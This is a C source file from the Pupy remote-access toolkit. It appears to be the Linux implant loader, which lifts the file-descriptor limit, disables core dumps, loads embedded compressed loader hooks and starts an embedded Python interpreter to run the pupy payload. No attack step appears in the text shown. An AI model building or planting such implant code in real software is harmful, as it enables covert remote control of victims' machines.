/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#define _GNU_SOURCE
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>

#include "tmplibrary.h"
#include "debug.h"

#include "pupy_load.h"
#include "Python-dynload.c"
#include "revision.h"
#include "ld_hooks.h"

extern DL_EXPORT(void) init_pupy(void);

#ifdef _LD_HOOKS_NAME
const char *__pathmap_callback(const char *path, char *buf, size_t buf_size);
#endif

uint32_t mainThread(int argc, char *argv[], bool so)
{

    struct rlimit lim;

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

    if (getrlimit(RLIMIT_NOFILE, &lim) == 0)
    {
        lim.rlim_cur = lim.rlim_max;
        setrlimit(RLIMIT_NOFILE, &lim);
    }

    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &lim);

#ifndef _LD_HOOKS_NAME
    _ld_hooks_main(argc, argv, NULL);
#else
    void *ld_hooks = xz_dynload(
        _LD_HOOKS_NAME, _LD_HOOKS_START, _LD_HOOKS_SIZE,
        NULL
    );

    if (ld_hooks) {
        void (*set_pathmap_callback)(cb_hooks_t cb) = dlsym(
            ld_hooks, "set_pathmap_callback");

        if (set_pathmap_callback) {
            set_pathmap_callback(__pathmap_callback);
            dprint("set_pathmap_callback: %p\n", set_pathmap_callback);
        } else {
            dprint("set_pathmap_callback not found\n");
        }
    } else {
        dprint("set_pathmap_callback: " _LD_HOOKS_NAME " not found\n");
    }

#endif

    dprint("Initializing python...\n");
    if (!initialize_python(argc, argv, so))
    {
        return -1;
    }

    init_pupy();

    dprint("Running pupy...\n");
    run_pupy();

    dprint("Global Exit\n");
    return 0;
}
